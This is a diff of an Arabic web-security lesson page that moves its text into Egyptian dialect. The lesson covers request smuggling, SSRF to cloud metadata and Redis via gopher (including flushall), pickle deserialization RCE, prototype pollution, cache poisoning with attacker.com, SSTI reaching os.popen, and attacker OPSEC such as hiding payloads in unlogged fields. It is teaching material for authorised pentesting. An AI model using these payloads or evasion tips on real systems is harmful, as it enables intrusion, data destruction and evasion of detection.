@@ -9,24 +9,21 @@ export default function Page() {
           <>
             <Section title="مقدمة — الويب ليس OWASP Top 10">
               <Analogy>
-                المبتدئ يفكر في الويب كقائمة ثغرات (SQLi، XSS، CSRF). المحترف يفكر فيه كـ <b>طبقات تتفاعل بطرق غير متوقعة</b>:
+                المبتدئ بيفكر في الويب كأنه لستة ثغرات (SQLi، XSS، CSRF). المحترف بيشوفه كـ <b>طبقات بتتفاعل بطرق متوقعش</b>:
                 Browser ↔ CDN ↔ WAF ↔ Load Balancer ↔ Reverse Proxy ↔ App ↔ Cache ↔ Queue ↔ DB ↔ Microservices ↔ S3.
-                الـ 0day الحقيقي ليس في طبقة واحدة — بل في <b>الخلاف بين طبقتين</b> حول كيف تفسر نفس البايت.
+                الـ 0day الحقيقي مش في طبقة واحدة — هو في <b>الخلاف بين طبقتين</b> على إزاي يفهموا نفس الـ byte. اللي مش بياخد باله من الفجوة دي مش هيلاقي حاجة محترمة.
               </Analogy>
-              <Callout kind="danger" title="تنبيه قانوني — نطاق اختبار اختراق فقط">
-                كل ما هنا يُستخدم على أهداف مع تفويض مكتوب صريح، أو في bug bounty داخل الـ scope المعلن، أو في مختبرك الخاص.
-                خارج ذلك = جريمة. لا توجد منطقة رمادية.
+              <Callout kind="danger" title="قانوني — نطاق pentest بس">
+                كل اللي هنا بيتطبق على أهداف معاها تفويض مكتوب صريح، أو bug bounty جوه scope معلن، أو في الـ lab بتاعك. خارج ده = جريمة. مفيش منطقة رمادية، خليك واضح مع نفسك.
               </Callout>
               <p className="opacity-80">
-                هذا الدرس يفترض أنك تتقن OWASP Top 10. هنا نذهب إلى ما يستخدمه فعلياً orange.tw, snyff, albinowax, James Kettle:
-                request smuggling مركّب، prototype pollution → RCE، deserialization gadget chains، SSRF عبر cloud metadata،
-                race conditions على single-packet، OAuth abuse، WAF bypass عبر parser differential.
+                الدرس ده بيفترض إنك متمكن من OWASP Top 10 خلاص. هنا بنروح للسكة اللي orange.tw وsnyff وalbinowax وJames Kettle ساكنين فيها: request smuggling مركّب، prototype pollution → RCE، deserialization gadget chains، SSRF عن طريق cloud metadata، race conditions بـ single-packet، OAuth abuse، وWAF bypass عن طريق parser differential.
               </p>
             </Section>
 
             <Section title="منهجية Red Team للويب — قبل الاستغلال">
               <Step n={1} title="رسم خريطة الـ stack">
-                <p>قبل ضربة واحدة، ارسم: ما هو CDN؟ Cloudflare/Akamai/Fastly؟ ما هو WAF؟ ما origin server؟ هل خلفه load balancer؟ هل التطبيق Java/Node/Python/Go/.NET؟ كل إجابة تفتح فئة ثغرات و تغلق أخرى.</p>
+                <p>قبل ما ترمي ضربة واحدة، ارسم الـ stack: مين الـ CDN؟ Cloudflare ولا Akamai ولا Fastly؟ مين الـ WAF؟ مين الـ origin server؟ ورا origin في load balancer؟ التطبيق Java ولا Node ولا Python ولا Go ولا .NET؟ كل إجابة بتفتحلك فئة ثغرات وبتقفل تانية. الاستطلاع هو نص اللعبة.</p>
                 <Code lang="bash">{`# أساسيات
 curl -sI https://target | head -30          # Server, X-Powered-By, CF-Ray, Via
 nslookup target                               # IP، CNAME، Anycast؟
@@ -36,7 +33,7 @@ wafw00f https://target
 shodan search ssl:"target.com" -c 200          # أو crt.sh + scan IPs مباشرة`}</Code>
               </Step>
               <Step n={2} title="بصمة الـ parser stack">
-                <p>الـ HTTP parser الذي يعمل على CDN قد يفسر <code>Content-Length</code> بطريقة، و الـ origin بطريقة أخرى. هذا الفرق هو <b>أصل request smuggling</b>. أرسل طلبات malformed خفيفة و راقب الفروق:</p>
+                <p>الـ HTTP parser اللي شغال على الـ CDN ممكن يفهم الـ <code>Content-Length</code> بطريقة، والـ origin يفهمها بطريقة تانية. الفرق ده هو <b>أصل الـ request smuggling</b>. ابعت طلبات malformed خفيفة وراقب الفرق في الردود:</p>
                 <Code lang="bash">{`# طلب بـ Content-Length و Transfer-Encoding معاً
 printf 'POST / HTTP/1.1\\r\\nHost: target\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGGG' | \\
   ncat --ssl target 443
@@ -56,8 +53,8 @@ subzy run --targets subs.txt`}</Code>
 
             <Section title="HTTP Request Smuggling — قلب أبحاث 2019-2026">
               <Analogy>
-                تخيل أن CDN يقرأ "هذا طلب واحد طوله 100 بايت"، و origin يقرأ "هذان طلبان". البايتات الزائدة عند CDN تصبح
-                <b> بداية طلب الضحية التالي</b>. أنت تكتب جزءاً من طلب شخص آخر — تختطف الجلسات، تسرق cookies، تتجاوز WAF.
+                تخيل إن الـ CDN بيقرا &quot;ده طلب واحد طوله 100 byte&quot;، والـ origin بيقرا &quot;دول طلبين&quot;. الـ bytes الزيادة عند الـ CDN بتبقى
+                <b> بداية طلب الضحية اللي جاي</b>. إنت بتكتب جزء من طلب شخص تاني — بتختطف جلسات، بتسرق cookies، بتعدّي WAF. مش هزار.
               </Analogy>
               <TwoCol>
                 <Card title="CL.TE الكلاسيكي" color="red">
@@ -107,8 +104,7 @@ nghttp -v --header=':method: POST' --header='content-length: 0' \\
 
             <Section title="SSRF متقدم — أكثر من جلب URL">
               <Analogy>
-                SSRF = أنت تجعل السيرفر يطرق الباب نيابة عنك. السيرفر داخل الشبكة، يثق في أصدقائه: cloud metadata API،
-                Redis، databases، internal APIs. ضربة SSRF واحدة = pivot لـ ENV الكاملة.
+                SSRF = إنت بتخلي السيرفر يخبط على الباب نيابة عنك. السيرفر جوه الشبكة بيثق في أصحابه: cloud metadata API، Redis، databases، internal APIs. ضربة SSRF واحدة = pivot لـ ENV كاملة. الباب اللي إنت متقفل قدامك، السيرفر مفتوحله.
               </Analogy>
               <Card title="AWS IMDS — لا يزال يعمل ضد IMDSv1" color="red">
                 <Code lang="bash">{`# إذا التطبيق يجلب URL من user input
@@ -142,9 +138,7 @@ curl "https://target/fetch?url=gopher://10.0.0.5:6379/_*1%0d%0a%248%0d%0aflushal
 
             <Section title="Deserialization — RCE من سلسلة gadget">
               <p className="opacity-90">
-                تطبيقات Java/PHP/Python/.NET/Ruby التي تـ deserialize input غير موثوق هي نقطة RCE تقليدية. الفكرة:
-                لا تنفذ الكود مباشرة — بل تبني سلسلة من استدعاءات الـ getter/setter/magic methods (gadget chain) ينتهي عند
-                <code> Runtime.exec</code> أو <code>system()</code>.
+                تطبيقات Java/PHP/Python/.NET/Ruby اللي بتعمل deserialize لـ input غير موثوق دي نقطة RCE كلاسيكية. الفكرة: مش بتشغّل الكود مباشرة — لأ، بتبني سلسلة من استدعاءات الـ getter/setter/magic methods (اسمها gadget chain) بتنتهي عند <code>Runtime.exec</code> أو <code>system()</code>. السلسلة دي هي ذكاء الـ exploit.
               </p>
               <TwoCol>
                 <Card title="Java — ysoserial" color="red">
@@ -176,8 +170,7 @@ print(base64.b64encode(pickle.dumps(P())).decode())`}</Code>
 
             <Section title="Prototype Pollution — JS من XSS إلى RCE">
               <Analogy>
-                في JavaScript كل object يرث من <code>Object.prototype</code>. لو تستطيع تعديل <code>__proto__</code>، فأنت
-                تعدّل سلوك <b>كل object في التطبيق</b> — بما فيها كائنات لم تُنشأ بعد. على الـ server (Node.js)، هذا يصل لـ RCE.
+                في JavaScript كل object بيرث من <code>Object.prototype</code>. لو قدرت تعدّل في <code>__proto__</code>، إنت بتغيّر سلوك <b>كل object في التطبيق</b> — حتى الكائنات اللي لسه متعملتش. على السيرفر (Node.js)، ده بيوصلك لـ RCE من غير ما حد ياخد باله.
               </Analogy>
               <Code lang="bash">{`# Client-side
 curl 'https://target/api/merge?__proto__[isAdmin]=true'
@@ -200,8 +193,7 @@ curl -X POST https://target/api/profile \\
 
             <Section title="Race Conditions — Single-Packet Attack (Kettle 2023)">
               <Analogy>
-                طلبان متطابقان يصلان قبل أن يكمل الأول التحقق → تنفّذ نفس العملية مرتين. كلاسيكياً يحتاج توقيت دقيق.
-                Kettle أثبت أنك تستطيع إرسال <b>20-30 طلباً في حزمة TCP واحدة</b> → يصلون كلهم في نفس الـ millisecond.
+                طلبين متطابقين بيوصلوا قبل ما الأول يخلّص الـ check → نفس العملية بتتنفذ مرتين. كلاسيكياً ده محتاج توقيت دقيق. Kettle أثبت إنك تقدر تبعت <b>20-30 طلب في TCP packet واحد</b> → كلهم بيوصلوا في نفس الـ millisecond. اللعبة كانت ضد الراتر، دلوقتي مع الراتر.
               </Analogy>
               <Code lang="bash">{`# Burp Suite "Send group in single packet"
 # أو turbo-intruder script
@@ -231,8 +223,7 @@ X-Forwarded-Host: attacker.com
 # CDN يخزن هذا الرد لكل الزوار التاليين على /
 # = stored XSS عبر cache على homepage`}</Code>
               <p className="opacity-90 mt-2">
-                التقنية الأقوى: <b>Cache Deception</b>. <code>/profile/x.css</code> — التطبيق يخدم profile (يتجاهل
-                .css)، CDN يخزنه كـ static. أي زائر بعدك يرى ملفك الشخصي.
+                التقنية الأقوى من دي: <b>Cache Deception</b>. <code>/profile/x.css</code> — التطبيق بيقدّم الـ profile (بيتجاهل .css)، الـ CDN بيخزّنه كأنه static. أي زائر هييجي بعدك هيشوف ملفك الشخصي. كارثة بصمت.
               </p>
             </Section>
 
@@ -268,7 +259,7 @@ curl -X POST https://target/graphql -H 'Content-Type: application/json' \\
 
             <Section title="WAF Bypass — معركة الـ parser">
               <p className="opacity-90">
-                الـ WAF يطبّق regex على ما يفهمه. التطبيق يفهم شيئاً مختلفاً قليلاً. الفرق هو سطح الـ bypass.
+                الـ WAF بيشغّل regex على اللي هو فاهمه. التطبيق فاهم حاجة مختلفة شوية. الفرق ده هو سطح الـ bypass. اللعبة كلها في الـ parser differential.
               </p>
               <TwoCol>
                 <Card title="ترميز مزدوج" color="red">
@@ -327,13 +318,13 @@ curl 'https://target/render?name={{config.__class__.__init__.__globals__["os"].p
 
             <Section title="OPSEC للمهاجم على الويب">
               <ul className="list-disc pe-6 space-y-2 opacity-90">
-                <li><b>لا تستخدم IP بيتك</b>. VPN → VPS → target. إن أمكن، CDN-fronted callback.</li>
-                <li><b>User-Agent يطابق المستهدف</b>: لو الموقع عربي، استخدم Chrome AR. لا تستخدم <code>python-requests/2.28</code>.</li>
-                <li><b>تجنب أنماط الفحص الجماعي</b>. Nuclei بكل templates يضوّي WAF فوراً. استخدم template-by-template مع <code>--rate-limit 5</code>.</li>
-                <li><b>تأخير يدوي</b> على الإجراءات الحرجة. إنسان لا ينفّذ 100 طلب في الثانية.</li>
-                <li><b>اخفِ الـ payload في حقل لا يُسجّل</b>. كثير من التطبيقات تسجّل query string فقط — استخدم body أو cookie.</li>
-                <li><b>لا تستخدم burpcollaborator.net مباشرة</b> في عمليات حساسة. استضف interactsh على دومين خاص.</li>
-                <li><b>تنظيف post-exploitation</b>: كل ملف رفعته، سجل أنشأته، حساب أدخلته — وثّقه ثم أزله.</li>
+                <li><b>متستخدمش الـ IP بتاع بيتك أبداً.</b> VPN → VPS → target. ولو ينفع، CDN-fronted callback.</li>
+                <li><b>الـ User-Agent يطابق جمهور الهدف.</b> متبعتش <code>python-requests/2.28</code> — ده زي ما تقول &quot;أهلاً أنا روبوت&quot;.</li>
+                <li><b>ابعد عن أنماط الفحص الجماعي.</b> Nuclei بكل الـ templates بيشعل الـ WAF فوراً. اشتغل template by template مع <code>--rate-limit 5</code>.</li>
+                <li><b>تأخير يدوي</b> على الإجراءات الحرجة. مفيش إنسان بيعمل 100 request في الثانية.</li>
+                <li><b>خبّي الـ payload في حقل مش بيتسجّل.</b> كتير من التطبيقات بتسجّل الـ query string بس — استخدم الـ body أو الـ cookie.</li>
+                <li><b>متستخدمش burpcollaborator.net مباشرة</b> في العمليات الحساسة. استضيف interactsh على دومين خاص بيك.</li>
+                <li><b>تنظيف post-exploitation</b>: كل ملف رفعته، كل log عملته، كل حساب أضفته — وثّقه ثم شيله. حياتك المهنية في الترتيب.</li>
               </ul>
             </Section>
 
